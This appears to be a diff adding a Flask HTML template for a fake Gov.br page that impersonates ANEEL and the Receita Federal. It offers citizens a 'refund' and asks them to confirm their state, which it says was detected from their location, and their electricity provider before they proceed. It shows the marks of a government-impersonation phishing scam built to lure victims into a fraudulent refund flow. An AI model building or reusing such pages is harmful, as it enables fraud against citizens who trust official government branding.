@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gov.br - Confirmação de Dados</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'gov-blue': '#003399',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
+                <div>
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
+                    </p>
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Barra Azul -->
+    <div class="bg-gov-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">CONFIRMAÇÃO DE DADOS</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-2xl mx-auto">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="mb-6">
+                    <h2 class="text-lg font-bold text-gov-blue mb-2">Confirmação de Dados para Restituição</h2>
+                    <p class="text-gray-600">Por favor, confirme as informações abaixo para prosseguir com sua solicitação de restituição:</p>
+                </div>
+
+                <form action="{{ url_for('confirmar_dados') }}" method="POST" class="space-y-6">
+                    <!-- Estado -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-medium text-gray-700">Estado de Residência</label>
+                        <div class="relative">
+                            <select name="estado" id="estado" class="block w-full p-3 border border-gray-300 rounded-lg focus:ring-gov-blue focus:border-gov-blue appearance-none cursor-pointer pr-10" required>
+                                <option value="">Selecione seu estado</option>
+                                <option value="AC" {% if estado_detectado == 'AC' %}selected{% endif %}>Acre</option>
+                                <option value="AL" {% if estado_detectado == 'AL' %}selected{% endif %}>Alagoas</option>
+                                <option value="AP" {% if estado_detectado == 'AP' %}selected{% endif %}>Amapá</option>
+                                <option value="AM" {% if estado_detectado == 'AM' %}selected{% endif %}>Amazonas</option>
+                                <option value="BA" {% if estado_detectado == 'BA' %}selected{% endif %}>Bahia</option>
+                                <option value="CE" {% if estado_detectado == 'CE' %}selected{% endif %}>Ceará</option>
+                                <option value="DF" {% if estado_detectado == 'DF' %}selected{% endif %}>Distrito Federal</option>
+                                <option value="ES" {% if estado_detectado == 'ES' %}selected{% endif %}>Espírito Santo</option>
+                                <option value="GO" {% if estado_detectado == 'GO' %}selected{% endif %}>Goiás</option>
+                                <option value="MA" {% if estado_detectado == 'MA' %}selected{% endif %}>Maranhão</option>
+                                <option value="MT" {% if estado_detectado == 'MT' %}selected{% endif %}>Mato Grosso</option>
+                                <option value="MS" {% if estado_detectado == 'MS' %}selected{% endif %}>Mato Grosso do Sul</option>
+                                <option value="MG" {% if estado_detectado == 'MG' %}selected{% endif %}>Minas Gerais</option>
+                                <option value="PA" {% if estado_detectado == 'PA' %}selected{% endif %}>Pará</option>
+                                <option value="PB" {% if estado_detectado == 'PB' %}selected{% endif %}>Paraíba</option>
+                                <option value="PR" {% if estado_detectado == 'PR' %}selected{% endif %}>Paraná</option>
+                                <option value="PE" {% if estado_detectado == 'PE' %}selected{% endif %}>Pernambuco</option>
+                                <option value="PI" {% if estado_detectado == 'PI' %}selected{% endif %}>Piauí</option>
+                                <option value="RJ" {% if estado_detectado == 'RJ' %}selected{% endif %}>Rio de Janeiro</option>
+                                <option value="RN" {% if estado_detectado == 'RN' %}selected{% endif %}>Rio Grande do Norte</option>
+                                <option value="RS" {% if estado_detectado == 'RS' %}selected{% endif %}>Rio Grande do Sul</option>
+                                <option value="RO" {% if estado_detectado == 'RO' %}selected{% endif %}>Rondônia</option>
+                                <option value="RR" {% if estado_detectado == 'RR' %}selected{% endif %}>Roraima</option>
+                                <option value="SC" {% if estado_detectado == 'SC' %}selected{% endif %}>Santa Catarina</option>
+                                <option value="SP" {% if estado_detectado == 'SP' %}selected{% endif %}>São Paulo</option>
+                                <option value="SE" {% if estado_detectado == 'SE' %}selected{% endif %}>Sergipe</option>
+                                <option value="TO" {% if estado_detectado == 'TO' %}selected{% endif %}>Tocantins</option>
+                            </select>
+                            <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <i class="fas fa-chevron-down"></i>
+                            </div>
+                        </div>
+                        <p class="text-sm text-gray-500">Estado detectado automaticamente com base na sua localização</p>
+                    </div>
+
+                    <!-- Companhia Elétrica -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-medium text-gray-700">Companhia de Energia Elétrica</label>
+                        <div class="relative">
+                            <select name="companhia" id="companhia" class="block w-full p-3 border border-gray-300 rounded-lg focus:ring-gov-blue focus:border-gov-blue appearance-none cursor-pointer pr-10" required>
+                                <option value="">Selecione sua companhia elétrica</option>
+                                {% for companhia in companhias %}
+                                <option value="{{ companhia.id }}">{{ companhia.nome }}</option>
+                                {% endfor %}
+                            </select>
+                            <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <i class="fas fa-chevron-down"></i>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
+                        <span>Confirmar e Prosseguir</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
+    </div>
+
+    <script>
+        // Atualizar lista de companhias quando o estado for alterado
+        document.getElementById('estado').addEventListener('change', function() {
+            const estado = this.value;
+            const companhiaSelect = document.getElementById('companhia');
+            
+            // Limpar opções atuais
+            companhiaSelect.innerHTML = '<option value="">Selecione sua companhia elétrica</option>';
+            
+            if (estado) {
+                // Fazer requisição para buscar companhias do estado selecionado
+                fetch(`/api/companhias/${estado}`)
+                    .then(response => response.json())
+                    .then(companhias => {
+                        companhias.forEach(companhia => {
+                            const option = document.createElement('option');
+                            option.value = companhia.id;
+                            option.textContent = companhia.nome;
+                            companhiaSelect.appendChild(option);
+                        });
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
